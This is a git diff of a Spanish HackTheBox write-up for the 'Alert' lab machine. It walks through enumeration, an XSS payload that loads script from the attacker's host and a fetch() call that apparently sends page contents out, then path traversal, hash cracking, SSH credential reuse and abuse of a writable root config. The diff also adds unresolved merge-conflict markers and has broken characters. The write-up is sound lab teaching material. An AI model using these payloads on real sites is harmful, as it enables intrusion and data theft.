@@ -1,8 +1,8 @@
 ---
 title: "Alert - Writeup (Hackthebox)"
 permalink: "/Alert-Writeup/"
-tags: ["Linux", "Hackthebox", "Easy", "XSS", "Path Traversal", "Hash Cracking", "SSH local P�ort Forwarding"]
-categories: ["linux", "hackthebox", "hacking", "writeup"]
+tags: ["Linux", "Hackthebox", "Easy", "XSS", "Path Traversal", "Hash Cracking", "SSH Local Port Forwarding"]
+categories: ["linux", "hackthebox", "hacking", "hacking-web", "writeup"]
 toc: true
 toc_label: "Topics"
 toc_sticky: true
@@ -24,7 +24,11 @@ Alert es una máquina perteneciente a la plataforma de HackTheBox de dificultad 
 
 # Reconocimiento
 ---
+<<<<<<< HEAD
 Lanzaremos una traza ICMP para verificar que la máquina se encuentra activa y responda nuestras conexiones
+=======
+## Nmap
+>>>>>>> 3c68442096d9b250b2603b97e264728205ac8a5d
 
 ~~~ bash
 ping -c 1 10.10.11.44
@@ -74,7 +78,7 @@ Host is up (0.26s latency).
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
 |   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
 |_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
@@ -104,7 +108,7 @@ echo '10.10.11.44 alert.htb' >> /etc/hosts
 Haremos un pequeño escaneo antes de continuar para identificar las tecnologías web que pueda estar usando la máquina en su puerto `80`
 
 ~~~ bash
-whatweb http://alert.htb/                                                                                      
+whatweb http://alert.htb/
 http://alert.htb/ [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], RedirectLocation[index.php?page=alert], Title[Alert - Markdown Viewer]
 http://alert.htb/index.php?page=alert [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], Title[Alert - Markdown Viewer]
 ~~~
@@ -145,7 +149,7 @@ Existe una sección `Contact Us` en la que podemos enviar un mensaje, por lógic
 Usaremos `fuzzing` para descubrir archivos y directorios disponibles en el servidor que no estemos logrando visualizar
 
 ~~~ bash
-gobuster dir -u http://10.10.11.44/ -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt -t 5    
+gobuster dir -u http://10.10.11.44/ -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt -t 5
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -191,7 +195,7 @@ Target: http://alert.htb/
 Total requests: 114441
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload    
+ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
 000001261:   401        14 L     54 W       467 Ch      "statistics"
@@ -208,7 +212,7 @@ ID           Response   Lines    Word       Chars       Payload
 Antes de navegar hacia `statistics.alert.htb`, debemos agregar este subdominio al archivo `/etc/hosts`
 
 ~~~ bash
-cat /etc/hosts | grep alert.htb    
+cat /etc/hosts | grep alert.htb
 10.10.11.44 alert.htb statistics.alert.htb
 ~~~
 
@@ -231,12 +235,12 @@ Target: http://statistics.alert.htb/FUZZ
 Total requests: 8531
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload       
+ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
 000000001:   403        9 L      28 W       285 Ch      ".htaccess"
 000000003:   403        9 L      28 W       285 Ch      ".htpasswd"
-000000002:   403        9 L      28 W       285 Ch      ".htaccess.bak"    
+000000002:   403        9 L      28 W       285 Ch      ".htaccess.bak"
 000000036:   403        9 L      28 W       285 Ch      "server-status"
 ~~~
 
@@ -257,7 +261,7 @@ Recordemos la sección de `Contact Us`, intentaremos ejecutar código `javascrpt
 <script src=http://10.10.14.254/test.js></script>
 ~~~
 
-En teoría, al visualizarse este archivo, se realizará una solicitud HTTP a nuestro servidor que tendremos iniciado con `python`, y se solicitará el recurso `test.js`. Crearemos nuestro payload que se encargue de enviarnos el contenido de un archivo que queramos visualizar, como queremos 
+En teoría, al visualizarse este archivo, se realizará una solicitud HTTP a nuestro servidor que tendremos iniciado con `python`, y se solicitará el recurso `test.js`. Crearemos nuestro payload que se encargue de enviarnos el contenido de un archivo que queramos visualizar, como queremos
 
 ~~~ js
 fetch("http://alert.htb/messages.php")
@@ -275,7 +279,7 @@ Pondremos el link dentro del mensaje. Antes de enviarlo, debemos poner a la escu
 
 ~~~ bash
 python3 -m http.server 80
-~~~ 
+~~~
 
 ![image-center](/assets/images/posts/alert-xss-2.png){: .align-center}
 
@@ -323,7 +327,7 @@ Si has guardado este payload en otro archivo al igual que yo, **debes considerar
 
 ![image-center](/assets/images/posts/alert-path-traversal.png){: .align-center}
 
-Repetimos los pasos que hicimos anteriormente cuando nos trajimos el contenido del archivo `messages.php` 
+Repetimos los pasos que hicimos anteriormente cuando nos trajimos el contenido del archivo `messages.php`
 
 - Enviamos el archivo `test.md` al `Markdown Viewer`
 - Generamos el enlace para compartir el archivo
@@ -362,28 +366,32 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-manchesterunited (albert)     
+manchesterunited (albert)
 1g 0:00:00:00 DONE (2025-03-22 17:10) 6.250g/s 17600p/s 17600c/s 17600C/s meagan..medicina
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ~~~
 
+<<<<<<< HEAD
 Y la credencial encontrada es `manchesterunited`. Podemos usar esta contrase�a para conectarnos a la web de `statistics.alert.htb`. Además intentaremos vrificar si se reutilizan estas credenciales y nos permite conectarnos como el usuario `albert` por `ssh`
+=======
+Y la credencial encontrada es `manchesterunited`. Podemos usar esta contrase□a para conectarnos a la web de `statistics.alert.htb`. Además intentaremos vrificar si se reutilizan estas credenciales y nos permite conectarnos como el usuario `albert` por `ssh`
+>>>>>>> 3c68442096d9b250b2603b97e264728205ac8a5d
 
 ~~~ bash
-ssh albert@10.10.11.44 
+ssh albert@10.10.11.44
 
 The authenticity of host \'10.10.11.44 (10.10.11.44)' can't be established.
 ED25519 key fingerprint is SHA256:p09n9xG9WD+h2tXiZ8yi4bbPrvHxCCOpBLSw0o76zOs.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.11.44' (ED25519) to the list of known hosts.
-albert@10.10.11.44\'s password: 
+albert@10.10.11.44\'s password:
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)
 ...
 ...
 Last login: Sat Mar 22 19:49:05 2025 from 10.10.14.166
-albert@alert:~$ 
+albert@alert:~$
 ~~~
 
 
@@ -403,7 +411,7 @@ Una de las vías más comunes de enumeración en Linux son los privilegios del g
 
 ~~~ bash
 albert@alert:~$ sudo -l
-[sudo] password for albert: 
+[sudo] password for albert:
 Sorry, user albert may not run sudo on alert.
 ~~~
 
@@ -477,7 +485,7 @@ Content-type: text/html; charset=UTF-8
 - `-I`: Ver solamente las cabeceras HTTP de la respuesta del servidor
 
 
-## Root Time - Abusing Config File 
+## Root Time - Abusing Config File
 
 Dentro del directorio `/opt`, tenemos capacidad de escritura de un archivo de configuración donde el propietario es `root` bajo la ruta `/website-monitor/`. Esto es posible gracias a que somos parte del grupo `management` con el usuario `albert`
 
@@ -486,7 +494,7 @@ albert@alert:~$ ls -l /opt/website-monitor/config
 total 4
 -rwxrwxr-x 1 root management 49 Mar 22 21:41 configuration.php
 
-albert@alert:/opt/website-monitor$ cat config/configuration.php 
+albert@alert:/opt/website-monitor$ cat config/configuration.php
 <?php
 define('PATH', '/opt/website-monitor');
 ?>
